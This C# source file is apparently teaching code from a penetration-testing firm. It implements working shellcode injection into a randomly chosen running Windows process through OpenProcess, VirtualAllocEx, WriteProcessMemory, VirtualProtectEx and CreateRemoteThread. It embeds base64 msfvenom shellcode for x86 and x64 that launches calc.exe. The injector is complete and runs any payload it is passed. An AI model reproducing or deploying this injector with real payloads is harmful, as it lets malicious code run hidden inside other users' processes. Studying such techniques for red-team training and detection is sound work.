using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;

/// <summary>
/// This is sample code for illustration and learning purposes only.
/// Author: Joff Thyer, Black Hills Information Security
/// February 2020
/// </summary>
public class Example3
{
    public static void Run(String x86, String x64)
    {
        String proc = FindTargetProcess();
        Console.WriteLine($"[*] Chosen process: {proc}");
        uint p_pid = UInt32.Parse(proc.Split(':')[0]);
        String p_name = proc.Split(':')[1] + ".exe";
        String p_arch = proc.Split(':')[2];

        String shellcode = x86;
        if (p_arch == "x64")
            shellcode = x64;

        Byte[] payload = Convert.FromBase64String(shellcode);
        IntPtr ph = OpenProcess(0x00000028, false, p_pid);
        Console.WriteLine($"[*] Open Process Handle: {ph}");
        if (ph == IntPtr.Zero) Environment.Exit(0);
        IntPtr memptr = VirtualAllocEx(ph, IntPtr.Zero, payload.Length, 0x3000, 0x40);
        Console.WriteLine($"[*] VirtualAlloc(): {memptr}");
        if (memptr == IntPtr.Zero) Environment.Exit(0);
        uint nbytes;
        WriteProcessMemory(ph, memptr, payload, payload.Length, out nbytes);
        Console.WriteLine($"[*] Wrote {nbytes} of payload into process memory");
        if (nbytes == 0) Environment.Exit(0);
        uint old_protections;
        VirtualProtectEx(ph, memptr, payload.Length, 0x20, out old_protections);
        Console.WriteLine($"[*] VirtualProtectEx({old_protections})");
        IntPtr th = CreateRemoteThread(ph, IntPtr.Zero, 0, memptr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.WriteLine($"[*] CreateRemoteThread({th})");
        VirtualFreeEx(ph, memptr, 0, 0xC000);
        CloseHandle(ph);
    }

    private static String FindTargetProcess()
    {
        Process[] procs = Process.GetProcesses();
        Dictionary<int, string> candidates = new Dictionary<int, string>();
        foreach (Process p in procs)
        {
            // Exception will be thrown
            // if not user owned process
            try
            {
                // Only 3 use cases will work
                // (1) 64-bit host and target process
                // (2) 64-bit host and 32-bit target process
                // (3) 32-bit host and 32-bit target process
                if (IntPtr.Size == 8 && Is64bit(p))
                    candidates.Add(p.Id, $"{p.ProcessName}:x64");
                else if (IntPtr.Size == 8 && !Is64bit(p))
                    candidates.Add(p.Id, $"{p.ProcessName}:x32");
                else if (IntPtr.Size == 4 && !Is64bit(p))
                    candidates.Add(p.Id, $"{p.ProcessName}:x32");
            }
            catch { continue; }
        }
        List<int> ckeys = candidates.Keys.ToList();
        Random rnd = new Random();
        int k = ckeys[rnd.Next(ckeys.Count)];
        return String.Format("{0:d}:{1:s}", k, candidates[k]);
    }

    private static bool Is64bit(Process p)
    {
        IsWow64Process(p.Handle, out bool is64);
        return !is64;
    }

    #region TESTCODE
    // Only needed for testing as EXE
    public static void Main() { Run(calc_x86, calc_x64); }
    #endregion

    #region DLLIMPORTS
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint p1, bool p2, uint p3);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr WriteProcessMemory(IntPtr p1, IntPtr p2, Byte[] p3, int p4, out uint p5);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr p1, IntPtr p2, int p3, uint p4, uint p5);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtectEx(IntPtr p1, IntPtr p2, int p3, uint p4, out uint p5);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr p1, IntPtr p2, uint p3, IntPtr p4, IntPtr p5, uint p6, IntPtr Zero);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualFreeEx(IntPtr p1, IntPtr p2, uint p3, uint p4);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CloseHandle(IntPtr p1);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void IsWow64Process(IntPtr p1, out bool p2); 
    #endregion

    #region SHELLCODE
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String calc_x86 = @"
/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String calc_x64 = @"
/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
    #endregion

}
